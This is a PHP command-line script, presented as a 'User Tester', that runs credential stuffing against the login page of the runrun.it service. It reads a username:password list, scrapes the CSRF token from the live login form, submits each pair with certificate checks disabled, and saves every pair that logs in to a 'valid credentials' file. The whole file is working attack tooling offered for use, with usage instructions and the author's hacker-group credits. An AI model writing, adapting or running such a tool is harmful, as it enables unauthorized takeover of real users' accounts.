<?php
/*
 * RunRun User Tester.
 * This is a simple script to test credentials into http://runrun.it system.
 * 
 * @Author Rodrigo "n4s" <@n4sss>
 * http://janissaries.org/
 */

set_time_limit(0);
error_reporting(E_ALL);

Class RunRun{
	
	var $url;
	var $cookie;
	var $http_response;
	var $http_info;
	var $user_file;
	var $output;
	var $user_agent;
	var $timeout;
	var $post_payload;
	var $auth_token;
	var $banner;
	
	function __construct($user_file, $output) {
		$this->user_file  = array_filter(explode("\n", file_get_contents($user_file)));
		$this->output     = $output;
		$this->timeout    = 10; // Adjust if you want.
		$this->user_agent = 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0';
		$this->cookie     = 'RUNRUN_COOKIE.txt';
		$this->banner     = "
		               _ __ _   _ _ __  _ __ _   _ _ __  
                      | '__| | | | '_ \| '__| | | | '_ \ 
                      | |  | |_| | | | | |  | |_| | | | |
                      |_|   \__,_|_| |_|_|   \__,_|_| |_|.it User Tester.
		\n\n";
	}
	
	// Rm cookie file to a clean request.
	function __destruct() {
		if(file_exists($this->cookie)):
			unlink($this->cookie);
		endif;
	}
	
	// Curl GET request.	
	function get() {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $this->url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookie);
		curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookie);
		curl_setopt($ch, CURLOPT_USERAGENT, $this->cookie);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: close', 'Expect:'));
		$this->http_response = curl_exec($ch);
		$this->http_info     = curl_getinfo($ch);
	}
	
	// Curl POST request.
	function post() {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $this->url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $this->cookie);
		curl_setopt($ch, CURLOPT_COOKIEFILE, $this->cookie);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 0);
		curl_setopt($ch, CURLOPT_USERAGENT, $this->cookie);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: close', 'Expect:', 'Content-Type: application/x-www-form-urlencoded'));
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $this->post_payload);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		$this->http_response = curl_exec($ch);
		$this->http_info     = curl_getinfo($ch);
	}
	
	// Parse auth-token to create post payload
	function parseAuthToken() {
		if(preg_match("#content=\"(.+?)\" name=\"csrf-token\"#", $this->http_response, $match))
			$this->auth_token = $match[1];
			return true;
		
		return false;
		
	}
	
	// Generate post payload and login into runrun
	function login($username, $password) {
		$post_payload = array();
		$post_payload['utf8']                      = '✓';
		$post_payload['authenticity_token']        = $this->auth_token;
		$post_payload['user_session[email]']       = $username;
		$post_payload['user_session[password]']    = $password;
		$post_payload['user_session[remember_me]'] = '0';
		$post_payload['commit']                    = 'Entrando...';
		
		$this->post_payload = http_build_query($post_payload);
		$this->post();

		if(strstr($this->http_response, 'redirected') !== false && $this->http_info['http_code'] == 302) return true;
		return false;
	}
	
	// Set uri, misc and save valid results.
	function init() {
		
		echo $this->banner;
		$this->url = 'https://secure.runrun.it/pt-BR/user_session';
		
		foreach($this->user_file as $credential):
			list($username, $password) = explode(":", $credential);
			$msg = sprintf("[-][AUTH-ERROR][RUNRUN.IT] %s:%s\n", $username, $password);
			
			$this->get();
			if($this->parseAuthToken()):
				if($this->login($username, $password)):
					$msg = sprintf("[+][VALID-CREDENTIAL][RUNRUN.IT] %s:%s\n", $username, $password);
					file_put_contents($this->output, $msg, FILE_APPEND);
				endif;
				
				echo $msg;
			else:
				echo "Fail to parse auth-token\n";
				break;
			endif;
		endforeach;
		
		echo sprintf("Valid credentials save to: %s\n\nBy Rodrigo \"n4sss\"\n", $this->output);
		
	}
}


$banner = "
	   _ __ _   _ _ __  _ __ _   _ _ __  
	  | '__| | | | '_ \| '__| | | | '_ \ 
	  | |  | |_| | | | | |  | |_| | | | |
	  |_|   \__,_|_| |_|_|   \__,_|_| |_|.it User Tester.

Use:
+-------------------------------------------------------------+
|~$ php runrun.php -f user_list.txt -o valid_credentials.txt  |
|                                                             |
|-f User list in format: (username:password);                 |
|-o Output to save valid credentials;                         |
|                                                             |
|       @n4sss | http://janissaries.org | p0cl4bs             |
+-------------------------------------------------------------+
";

$opt = getopt("f:o:");
if(is_array($opt) && isset($opt['f'], $opt['o'])):
	
	$file   = trim($opt['f']);
	$output = trim($opt['o']);
	
	$runrun = new RunRun($file, $output);
	$runrun->init();
	
	exit;
endif;	

exit($banner);
